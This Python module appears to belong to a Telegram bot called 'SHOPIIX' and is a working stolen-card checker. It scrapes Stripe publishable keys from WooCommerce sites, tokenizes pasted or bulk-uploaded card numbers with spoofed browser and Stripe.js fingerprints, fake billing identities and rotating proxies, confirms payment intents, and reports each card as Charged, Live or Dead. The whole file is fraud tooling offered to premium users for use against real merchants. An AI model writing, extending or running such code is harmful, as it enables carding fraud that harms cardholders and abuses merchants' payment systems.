import aiohttp
import asyncio
import re
import random
import time
import os
import uuid
import json
import aiofiles
from telethon import events, Button

# ─── CONFIG ────────────────────────────────────────────────────────────────────
STRIPE_API        = "https://api.stripe.com/v1"
MAX_CARDS         = 50000
_STRIPE_SITES_FILE = "stripe_sites.json"

_stripe_sites: dict = {}   # {user_id: site_url}
_pk_cache: dict     = {}   # {site_url: pk}

# ─── LIVE DECLINE CODES ────────────────────────────────────────────────────────
_LIVE_CODES = {
    'insufficient_funds', 'do_not_honor', 'transaction_not_allowed',
    'card_velocity_exceeded', 'withdrawal_count_limit_exceeded',
    'online_or_card_not_accepted', 'not_permitted', 'restricted_card',
    'security_violation', 'service_not_allowed', 'stop_payment_order',
    'revocation_of_all_authorizations', 'revocation_of_authorization',
    'otp_required', 'authentication_required',
}

_DEAD_CODES = {
    'invalid_number', 'invalid_expiry_month', 'invalid_expiry_year',
    'invalid_cvc', 'expired_card', 'incorrect_number',
    'incorrect_cvc', 'incorrect_zip', 'card_not_supported',
    'currency_not_supported', 'stolen_card', 'lost_card',
    'pickup_card', 'fraudulent', 'generic_decline',
}

_BROWSER_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
}

# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
def _load_stripe_sites():
    global _stripe_sites
    try:
        with open(_STRIPE_SITES_FILE) as f:
            data = json.load(f)
        _stripe_sites = {int(k): v for k, v in data.items()}
    except Exception:
        _stripe_sites = {}

def _save_stripe_sites():
    try:
        with open(_STRIPE_SITES_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _stripe_sites.items()}, f)
    except Exception:
        pass

def _get_user_site(user_id):
    return _stripe_sites.get(user_id)

def _set_user_site(user_id, url):
    _stripe_sites[user_id] = url
    _save_stripe_sites()
    # Clear cached PK for this site so it re-scrapes
    _pk_cache.pop(url, None)

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def _parse_card(card):
    parts = card.strip().replace(' ', '').split('|')
    if len(parts) < 4:
        return None
    cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(ano) == 2:
        ano = '20' + ano
    return cc, mes, ano, cvv

def _parse_proxy(p):
    if not p:
        return None
    for prefix in ['http://', 'https://', 'socks5://']:
        if p.lower().startswith(prefix):
            return p
    parts = p.split(':')
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    if len(parts) == 2:
        return f'http://{p}'
    return None

def _extract_cc(text):
    pattern = re.compile(
        r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b'
    )
    seen, cards = set(), []
    for m in pattern.finditer(text):
        card = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if card not in seen:
            seen.add(card)
            cards.append(card)
    return cards

def _random_email():
    names = ['john', 'mike', 'alex', 'james', 'chris', 'david', 'ryan']
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{random.choice(names)}{random.randint(10,999)}@{random.choice(domains)}"

def _random_name():
    first = random.choice(['John', 'Mike', 'Alex', 'James', 'Chris', 'David'])
    last  = random.choice(['Smith', 'Brown', 'Jones', 'Davis', 'Wilson'])
    return first, last

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# ─── PK SCRAPER ────────────────────────────────────────────────────────────────
async def _scrape_pk(session, site, proxy):
    if site in _pk_cache:
        return _pk_cache[site]

    _pk_patterns = [
        r'(pk_live_[A-Za-z0-9]{20,})',
        r'(pk_test_[A-Za-z0-9]{20,})',
    ]
    urls_to_try = [f'{site}/checkout/', f'{site}/', f'{site}/shop/']

    for url in urls_to_try:
        try:
            async with session.get(
                url, headers=_BROWSER_HEADERS, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
            ) as resp:
                text = await resp.text()
            for pat in _pk_patterns:
                m = re.search(pat, text)
                if m:
                    _pk_cache[site] = m.group(1)
                    return _pk_cache[site]
        except Exception:
            continue
    return None

# ─── CORE STRIPE FUNCTIONS ──────────────────────────────────────────────────────
async def _create_payment_method(session, cc, mes, ano, cvv, pk, site, proxy):
    first, last = _random_name()
    guid      = str(uuid.uuid4())
    muid      = str(uuid.uuid4())
    sid       = str(uuid.uuid4())
    card_hash = uuid.uuid4().hex[:16]
    headers = {
        'Authorization': f'Bearer {pk}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Origin': 'https://js.stripe.com',
        'Referer': f'https://js.stripe.com/v3/elements-inner-card-{card_hash}.html',
        'Stripe-Version': '2023-10-16',
    }
    data = (
        f'type=card'
        f'&card[number]={cc}'
        f'&card[exp_month]={int(mes)}'
        f'&card[exp_year]={ano}'
        f'&card[cvc]={cvv}'
        f'&billing_details[name]={first}+{last}'
        f'&billing_details[email]={_random_email()}'
        f'&billing_details[address][country]=US'
        f'&payment_user_agent=stripe.js%2F6fd82394%3B+stripe-js-v3%2F6fd82394%3B+elements-inner-card%2F{card_hash}'
        f'&time_on_page={random.randint(8000, 45000)}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&referrer={site}%2Fcheckout%2F'
    )
    try:
        async with session.post(
            f'{STRIPE_API}/payment_methods',
            headers=headers, data=data, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=15)
        ) as resp:
            result = await resp.json(content_type=None)
            if resp.status == 200 and result.get('id'):
                return result['id'], None
            err  = result.get('error', {})
            code = err.get('decline_code') or err.get('code') or err.get('message', 'tokenization_failed')
            return None, code
    except Exception as e:
        return None, f'pm_error: {e}'

async def _get_product_id(session, site, proxy):
    try:
        async with session.get(
            f'{site}/shop/',
            headers=_BROWSER_HEADERS, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
        ) as resp:
            text = await resp.text()
        matches = re.findall(r'data-product_id="(\d+)"', text)
        if matches:
            return matches[0]
        links = re.findall(r'\?add-to-cart=(\d+)', text)
        return links[0] if links else None
    except Exception:
        return None

async def _setup_cart_and_get_pi(session, site, proxy):
    try:
        product_id = await _get_product_id(session, site, proxy)
        if product_id:
            async with session.get(
                f'{site}/?add-to-cart={product_id}&quantity=1',
                headers=_BROWSER_HEADERS, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
            ) as resp:
                pass

        async with session.get(
            f'{site}/checkout/',
            headers=_BROWSER_HEADERS, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True
        ) as resp:
            checkout_text = await resp.text()

        nonce = None
        for pattern in [
            r'"createPaymentIntentNonce"\s*:\s*"([^"]+)"',
            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
            r'wc_stripe_params.*?"nonce"\s*:\s*"([^"]+)"',
        ]:
            m = re.search(pattern, checkout_text)
            if m:
                nonce = m.group(1)
                break

        if not nonce:
            return None

        ajax_headers = {
            **_BROWSER_HEADERS,
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{site}/checkout/',
        }
        for action in ['wc_stripe_create_payment_intent', 'wc_stripe_checkout']:
            async with session.post(
                f'{site}/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=f'action={action}&nonce={nonce}',
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=12)
            ) as resp:
                try:
                    pi_data = await resp.json(content_type=None)
                    secret  = (pi_data.get('data', {}).get('client_secret') or
                               pi_data.get('client_secret'))
                    if secret and '_secret_' in secret:
                        return secret
                except Exception:
                    continue
        return None
    except Exception:
        return None

async def _confirm_pi(session, client_secret, pm_id, pk, site, proxy):
    pi_id = client_secret.split('_secret_')[0]
    first, last = _random_name()
    headers = {
        'Authorization': f'Bearer {pk}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Origin': site,
        'Referer': f'{site}/checkout/',
        'Stripe-Version': '2023-10-16',
    }
    data = (
        f'payment_method={pm_id}'
        f'&client_secret={client_secret}'
        f'&return_url={site}/checkout/order-received/'
        f'&payment_method_data[billing_details][name]={first}+{last}'
        f'&payment_method_data[billing_details][address][country]=US'
    )
    try:
        async with session.post(
            f'{STRIPE_API}/payment_intents/{pi_id}/confirm',
            headers=headers, data=data, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=20)
        ) as resp:
            result = await resp.json(content_type=None)

        status = result.get('status', '')
        err    = result.get('error', {})
        lpe    = result.get('last_payment_error', {})

        if status in ('succeeded', 'requires_capture', 'processing'):
            return 'Charged', 'Payment Authorized ✅'
        if status == 'requires_action':
            nxt = result.get('next_action', {}).get('type', '')
            if '3ds' in nxt.lower() or 'redirect' in nxt.lower():
                return 'Live', '3DS Required'
            return 'Live', 'Requires Action'

        decline_code = (err.get('decline_code') or lpe.get('decline_code') or
                        err.get('code') or lpe.get('code') or '')
        message      = (err.get('message') or lpe.get('message') or status or 'Unknown')

        if decline_code in _LIVE_CODES:
            return 'Live', decline_code
        if decline_code in _DEAD_CODES:
            return 'Dead', decline_code or message
        return 'Dead', message
    except Exception as e:
        return 'Error', str(e)

async def stripe_auth(card, site, proxy_str=None):
    parsed = _parse_card(card)
    if not parsed:
        return {'status': 'Dead', 'message': 'Invalid format', 'card': card, 'gateway': 'Stripe Auth'}
    cc, mes, ano, cvv = parsed
    proxy = _parse_proxy(proxy_str)

    connector = aiohttp.TCPConnector(ssl=False, force_close=True)
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            pk = await _scrape_pk(session, site, proxy)
            if not pk:
                return {'status': 'Error', 'message': 'No Stripe PK found on site', 'card': card, 'gateway': 'Stripe Auth'}

            pm_id, pm_err = await _create_payment_method(session, cc, mes, ano, cvv, pk, site, proxy)
            if not pm_id:
                return {'status': 'Dead', 'message': pm_err or 'Tokenization failed', 'card': card, 'gateway': 'Stripe Auth'}

            client_secret = await _setup_cart_and_get_pi(session, site, proxy)
            if not client_secret:
                return {'status': 'Error', 'message': 'Could not get Payment Intent', 'card': card, 'gateway': 'Stripe Auth'}

            status, message = await _confirm_pi(session, client_secret, pm_id, pk, site, proxy)
            return {'status': status, 'message': message, 'card': card, 'gateway': 'Stripe Auth'}
    finally:
        await connector.close()

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):

    _load_stripe_sites()

    @bot.on(events.NewMessage(pattern=r'^/sadd(\s|$)'))
    async def sadd_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.reply(
                "❌ <b>Usage:</b> <code>/sadd https://yoursite.com</code>\n\n"
                "Site must be WooCommerce + Stripe.",
                parse_mode='html'
            )
            return

        url = _normalize_url(parts[1].strip())
        wait = await event.reply(f"⏳ Checking site for Stripe PK...", parse_mode='html')

        connector = aiohttp.TCPConnector(ssl=False, force_close=True)
        try:
            proxies = load_proxies_fn(user_id)
            proxy   = random.choice(proxies) if proxies else None
            async with aiohttp.ClientSession(connector=connector) as session:
                pk = await _scrape_pk(session, url, proxy)
        finally:
            await connector.close()

        if pk:
            _set_user_site(user_id, url)
            masked = pk[:12] + '...' + pk[-4:]
            await wait.edit(
                f"✅ <b>Stripe Site Added!</b>\n\n"
                f"🌐 <b>Site</b>  ▸  <code>{url}</code>\n"
                f"🔑 <b>PK</b>    ▸  <code>{masked}</code>\n\n"
                f"Now use <code>/st</code> or <code>/stxt</code> to check cards.",
                parse_mode='html'
            )
        else:
            await wait.edit(
                f"❌ <b>No Stripe PK found on this site.</b>\n\n"
                f"Make sure it's a WooCommerce + Stripe site.",
                parse_mode='html'
            )

    @bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
    async def st_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
            return
        site = _get_user_site(user_id)
        if not site:
            await event.reply(
                "❌ <b>No Stripe site set.</b>\n\n"
                "Use <code>/sadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.reply("❌ <b>Usage:</b> <code>/st card|mm|yy|cvv</code>", parse_mode='html')
            return

        card    = parts[1].strip()
        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None

        status_msg = await event.reply(
            f"⏳ <b>Stripe Auth</b> — Checking...\n<code>{card}</code>",
            parse_mode='html'
        )
        result  = await stripe_auth(card, site, proxy_str=proxy)
        status  = result['status']
        message = result['message']
        emoji   = '💎' if status == 'Charged' else ('🔥' if status == 'Live' else '❌')
        resp = (
            f"{emoji} <b>{status}</b>\n\n"
            f"💳 <b>Card</b>   ▸  <code>{card}</code>\n"
            f"◈  <b>Resp</b>   ▸  <i>{message}</i>\n"
            f"🌐 <b>GW</b>     ▸  Stripe Auth\n\n"
            f"⚡ <b>SHOPIIX</b>"
        )
        await status_msg.edit(resp, parse_mode='html')

    @bot.on(events.NewMessage(pattern=r'^/stxt(\s|$)'))
    async def stxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
            return
        site = _get_user_site(user_id)
        if not site:
            await event.reply(
                "❌ <b>No Stripe site set.</b>\n\n"
                "Use <code>/sadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return
        if not event.reply_to_msg_id:
            await event.reply("❌ Reply to a <b>.txt</b> file with cards.", parse_mode='html')
            return
        reply_msg = await event.get_reply_message()
        if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        wait_msg  = await event.reply("⏳ Reading file...", parse_mode='html')
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)

        cards = _extract_cc(content)
        if not cards:
            await wait_msg.edit("❌ No valid cards found in file.", parse_mode='html')
            return
        if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
            cards = cards[:MAX_CARDS]

        proxies = load_proxies_fn(user_id)
        total   = len(cards)
        results = {'charged': [], 'live': [], 'dead': [], 'total': total, 'start': time.time()}

        await wait_msg.edit(
            f"⚡ <b>Stripe Auth</b> — Starting\n💳 Cards: <b>{total}</b>",
            parse_mode='html'
        )
        prog_msg = await bot.send_message(user_id, "🔄 Checking...", parse_mode='html')
        _stop = [False]

        @bot.on(events.CallbackQuery(data=b'st_stop'))
        async def _stop_handler(e):
            if e.sender_id == user_id:
                _stop[0] = True
                await e.answer("⛔ Stopping...")

        async def _update_prog(checked):
            elapsed = int(time.time() - results['start'])
            h, rem  = divmod(elapsed, 3600)
            m, s    = divmod(rem, 60)
            buttons = [
                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]", b"noop")],
                [Button.inline(f"🔥  Live     →  [ {len(results['live'])} ]",    b"noop")],
                [Button.inline(f"❌  Dead     →  [ {len(results['dead'])} ]",    b"noop")],
                [Button.inline(f"✅  Progress →  [ {checked} / {total} ]",       b"noop")],
                [Button.inline(f"⏱  Time     →  {h}h {m}m {s}s",               b"noop")],
                [Button.inline("⛔  Stop", b"st_stop")],
            ]
            try:
                await bot.edit_message(user_id, prog_msg.id,
                    "⚡ <b>#Shopiix</b> — Stripe Auth\n🔄 <i>Checking...</i>",
                    buttons=buttons, parse_mode='html')
            except Exception:
                pass

        semaphore = asyncio.Semaphore(3)

        async def _check_one(card, idx):
            if _stop[0]:
                return
            async with semaphore:
                proxy  = random.choice(proxies) if proxies else None
                result = await stripe_auth(card, site, proxy_str=proxy)
                st     = result['status']
                if st == 'Charged':
                    results['charged'].append(result)
                elif st == 'Live':
                    results['live'].append(result)
                else:
                    results['dead'].append(result)
                if idx % 5 == 0 or idx == total:
                    await _update_prog(idx)

        await asyncio.gather(*[_check_one(c, i+1) for i, c in enumerate(cards)])

        elapsed = int(time.time() - results['start'])
        h, rem  = divmod(elapsed, 3600)
        m, s    = divmod(rem, 60)
        hits_txt = ''
        for r in results['charged'][:5]:
            hits_txt += f"💎 <code>{r['card']}</code>\n"
        for r in results['live'][:5]:
            hits_txt += f"🔥 <code>{r['card']}</code>\n"

        summary = (
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"⚡  <b>SHOPIIX · STRIPE AUTH DONE</b>  ⚡\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>TOTAL</b>    ▸  <code>{total}</code>\n"
            f"💎 <b>CHARGED</b>  ▸  <code>{len(results['charged'])}</code>\n"
            f"🔥 <b>LIVE</b>     ▸  <code>{len(results['live'])}</code>\n"
            f"❌ <b>DEAD</b>     ▸  <code>{len(results['dead'])}</code>\n"
            f"🌐 <b>GATEWAY</b>  ▸  Stripe Auth\n"
            f"⏱  <b>TIME</b>    ▸  {h}h {m}m {s}s\n\n"
            f"〔 🎯  H I T S 〕\n"
            f"<blockquote>{hits_txt or 'No hits'}</blockquote>\n\n"
            f"⚡ <b>SHOPIIX</b>"
        )
        try:
            await bot.edit_message(user_id, prog_msg.id, summary, parse_mode='html')
        except Exception:
            await bot.send_message(user_id, summary, parse_mode='html')

        bot.remove_event_handler(_stop_handler)
